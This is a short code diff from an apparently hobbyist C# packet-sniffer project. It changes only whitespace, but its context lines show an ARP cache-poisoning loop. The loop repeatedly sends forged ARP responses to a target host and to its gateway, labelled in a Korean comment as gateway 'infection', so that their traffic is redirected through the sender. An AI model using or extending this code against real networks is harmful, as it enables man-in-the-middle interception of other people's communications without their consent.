@@ -178,13 +178,13 @@ namespace Sniffer
                 EthernetPacket eth = new EthernetPacket(srcMac, targetMac, EthernetPacketType.Arp);
                 eth.PayloadPacket = arp;
                 device.SendPacket(eth);
-
+                    
                 //게이트웨이 Infection
                 ARPPacket arpForGateway = new ARPPacket(ARPOperation.Response, gatewayMac, gatewayIP, srcMac, targetIP);
                 EthernetPacket ethforGateway = new EthernetPacket(srcMac, gatewayMac, EthernetPacketType.Arp);
                 ethforGateway.ParentPacket = arpForGateway;
                 device.SendPacket(ethforGateway);
-
+                
 
                 Thread.Sleep(100);
             }
